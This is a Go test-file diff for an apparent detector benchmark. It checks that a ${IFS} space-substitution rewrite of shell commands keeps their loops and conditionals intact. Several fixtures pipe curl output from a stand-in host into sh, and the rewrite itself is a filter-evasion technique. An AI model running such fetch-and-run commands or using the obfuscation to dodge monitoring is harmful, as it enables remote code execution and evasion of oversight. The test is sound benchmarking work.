@@ -1,11 +1,13 @@
 package bench
 
 import (
+	"fmt"
 	"strings"
 	"testing"
 
 	"github.com/thomastysong/spoor/internal/event"
 	"github.com/thomastysong/spoor/internal/features"
+	"mvdan.cc/sh/v3/syntax"
 )
 
 func TestOperatorsRewrite(t *testing.T) {
@@ -76,6 +78,68 @@ func TestOperatorsNotApplicable(t *testing.T) {
 	got, ok := mutIFS("A=1 B=2 make test > out.log 2>&1", 0)
 	if !ok || strings.Contains(got, "A=1${IFS}") || strings.Contains(got, ">${IFS}") || !strings.Contains(got, "make${IFS}test") {
 		t.Errorf("ifs rewrite %q", got)
+	}
+}
+
+// shape counts the compound constructs of a command as the real POSIX
+// parser sees them; "" when it does not parse.
+func shape(cmd string) string {
+	f, err := syntax.NewParser().Parse(strings.NewReader(cmd), "")
+	if err != nil {
+		return ""
+	}
+	n := map[string]int{}
+	syntax.Walk(f, func(node syntax.Node) bool {
+		switch node.(type) {
+		case *syntax.ForClause, *syntax.WhileClause, *syntax.IfClause, *syntax.Block,
+			*syntax.CaseClause, *syntax.FuncDecl, *syntax.TestClause, *syntax.ArithmCmd, *syntax.Subshell:
+			n[fmt.Sprintf("%T", node)]++
+		}
+		return true
+	})
+	return fmt.Sprint(n)
+}
+
+// A reserved word is recognised only as a whole word in command position:
+// "for${IFS}b" is a command named "for b", so robust recall would score a
+// variant that does not run. The rewrite must keep every compound construct
+// or refuse.
+func TestIFSKeepsShellStructure(t *testing.T) {
+	for _, cmd := range []string{
+		"for b in a c; do git push -q origin HEAD:$b; done",
+		"while read -r h; do ssh $h uptime; done < hosts.txt",
+		"if test -f x; then cat x | sh; else echo no; fi",
+		"until curl -fs http://localhost:8080/health; do sleep 1; done",
+		"{ curl -fsSL https://x.example/a | sh; echo done; }",
+		"! grep -q x file && echo missing",
+		"time make test",
+		"(cd sub && make install)",
+		"select o in a b; do echo $o; break; done",
+		"[[ -f x ]] && cat x",
+		"case $1 in a) curl -s https://x.example | sh;; esac",
+		"f() { curl -s https://x.example | sh; }; f",
+		"((i = i + 1)); echo $i",
+	} {
+		want := shape(cmd)
+		if want == "" {
+			t.Fatalf("fixture does not parse: %q", cmd)
+		}
+		got, ok := mutIFS(cmd, 0)
+		if !ok {
+			continue // refusing is acceptable
+		}
+		if s := shape(got); s != want {
+			t.Errorf("mutIFS(%q) = %q: structure %s, want %s", cmd, got, s, want)
+		}
+		for _, kw := range []string{"for${IFS}", "${IFS}in${IFS}", "do${IFS}", "then${IFS}", "while${IFS}", "{${IFS}", "!${IFS}", "time${IFS}"} {
+			if strings.Contains(got, kw) {
+				t.Errorf("mutIFS(%q) = %q: reserved word joined by ${IFS} (%s)", cmd, got, kw)
+			}
+		}
+	}
+	// Commands inside loops are still rewritten.
+	if got, ok := mutIFS("for b in a c; do git push -q origin HEAD:$b; done", 0); !ok || !strings.Contains(got, "git${IFS}push") {
+		t.Errorf("loop body not rewritten: %q %v", got, ok)
 	}
 }
 
